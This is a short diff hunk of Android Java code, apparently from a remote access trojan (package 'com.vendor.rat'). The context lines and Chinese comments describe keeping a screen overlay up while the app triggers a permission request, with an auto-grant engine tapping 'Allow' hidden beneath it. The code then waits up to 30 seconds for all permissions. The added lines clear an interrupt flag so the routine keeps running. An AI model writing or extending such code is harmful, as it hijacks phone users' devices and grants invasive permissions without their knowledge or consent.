@@ -224,7 +224,9 @@ public abstract class BlockViewHelper {
                             try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
 
                             // app 已回到前台、遮罩还在 → 触发权限请求
+                            // HuaweiEngine 通过 finishAsync() 异步调用 Z()，不在 f227l 锁内
                             // PermissionAutoGrantEngine 在遮罩下自动点击"允许"
+                            Thread.interrupted(); // 清除 shutdownNow 设置的中断标志
                             com.vendor.rat.activity.ActivMain.triggerPermissionRequest();
                             // 轮询等待权限全部授予（最多 30 秒）
                             for (int pw = 0; pw < 60; pw++) {
